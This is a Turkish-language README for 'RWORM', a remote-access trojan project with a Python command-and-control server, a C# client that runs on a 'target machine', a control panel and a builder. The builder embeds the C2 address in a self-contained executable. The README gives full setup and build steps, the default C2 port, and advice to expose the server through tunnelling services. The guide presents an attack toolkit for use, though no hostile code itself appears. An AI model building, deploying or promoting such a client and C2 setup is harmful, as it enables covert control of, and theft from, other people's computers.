# RWORM

Uzaktan erişim yönetim paneli (RAT) projesi. Üç bileşenden oluşur:

| Bileşen | Konum | Teknoloji | Görev |
|---|---|---|---|
| **C2 Server** | `server/` | Python (stdlib + `cryptography`) | İstemcileri dinler, komut yönlendirir, SQLite kayıt tutar |
| **Client** | `Client/` | C# / .NET 8 (WinForms, `win-x64`, single-file) | Hedef makinede çalışan istemci |
| **GUI Panel** | `GUI/` | C# / .NET 8 (WPF) | Görsel yönetim paneli |
| **Builder** | `Builder/` | C# konsol uygulaması | Client'ı C2 host/port gömülü şekilde derler |

Varsayılan C2 portu: **3333**

---

## Sistem Gereksinimleri

### Zorunlu

- **Windows 10/11 x64** — Client `win-x64` runtime hedefliyor, GUI WPF üzerine kurulu (`net8.0-windows`).
- **Python 3.11+** — proje 3.11 ile geliştirildi (`__pycache__` .pyc'leri 3.11); 3.12/3.13 sorunsuz çalışır.
  ```powershell
  python --version
  ```
- **Python paketi:**
  ```
  cryptography>=41.0.0
  ```
  Tek harici bağımlılık; geri kalan her şey Python standart kütüphanesi (`socket`, `sqlite3`, `threading`, `hashlib`, `struct` ...).
- **.NET 8 SDK** — Client, GUI ve Builder derlemesi için gerekli. Runtime yetmez, **SDK** kurulu olmalı:
  ```powershell
  dotnet --list-sdks     # 8.0.x listelenmeli
  ```
  Çıktı boşsa: https://dotnet.microsoft.com/download/dotnet/8.0 → ".NET SDK 8.0 (x64)" indirip kurun.
- **Git** — repo klonlama/pull için.

### İsteğe bağlı

- **Visual Studio 2022 (17.x)** — `RWORM.sln` dosyasını IDE'de açmak isterseniz; komut satırından `dotnet build`/`dotnet publish` ile de derlenebilir, VS şart değil.
- **Ngrok / Cloudflare Tunnel vb.** — server'ı internete açacaksanız.

---

## Kurulum

### 1. Repo

```powershell
git clone https://github.com/exsarorrayzer/rworm.git
cd rworm
```

### 2. Server

```powershell
cd server
python -m venv .venv
.venv\Scripts\activate
pip install -r requirements.txt
```

Çalıştırma:

```powershell
python main.py --host 0.0.0.0 --port 3333
```

### 3. Client derleme

Builder C2 host/port'u `Client/Core/Config.cs` içine yazıp `dotnet publish` çalıştırır:

```powershell
cd Builder
dotnet run -c Release
# C2 Host, Port ve çıktı dosya adını sorar
```

Ya da elle, Config.cs'i düzenledikten sonra:

```powershell
dotnet publish Client\RWORM.Client.csproj -c Release -r win-x64 --self-contained -o out\
```

Çıktı: tek dosya, self-contained `RWORM.exe` (hedef makinede .NET kurulumu gerektirmez).

### 4. GUI Panel

```powershell
dotnet build GUI\RWORM.GUI.csproj -c Release
# veya
dotnet run --project GUI\RWORM.GUI.csproj
```

---

## Proje Yapısı

```
rworm/
├── RWORM.sln              # VS çözümü (Client + GUI)
├── Builder/               # Console builder (Config.cs patch + publish)
├── Client/                # .NET 8 WinForms istemci
│   └── Core/Config.cs     # C2 host/port (builder tarafından güncellenir)
├── GUI/                   # WPF yönetim paneli
│   └── Resources/Flags/   # Ülke bayrakları (PNG)
└── server/                # Python C2
    ├── main.py            # Giriş noktası (argparse: --host --port)
    ├── requirements.txt
    ├── core/              # protocol, server, session
    ├── handlers/          # komut işleyicileri (shell vb.)
    └── database/          # SQLite (rworm.db)
```

---

## Sorun Giderme

- **`dotnet` komutu bulunamıyor / SDK hatası** → .NET 8 SDK kurulu mu kontrol edin (`dotnet --list-sdks`), VS kurulumundan ".NET uygulama geliştirme paketi" seçili olmalı.
- **Client derlemesi `net8.0-windows` hatası veriyor** → Sadece Windows'ta derlenir; `UseWindowsForms`/`UseWPF` Windows-only.
- **Server port açılamıyor** → Port başka bir süreçte veya firewall'da engelli: `netstat -ano | findstr :3333`
- **GUI bayrakları görünmüyor** → `Resources/Flags/**/*.png` csproj'de `CopyToOutputDirectory` ile işaretli; elle taşındıysa output yanına kopyalayın.
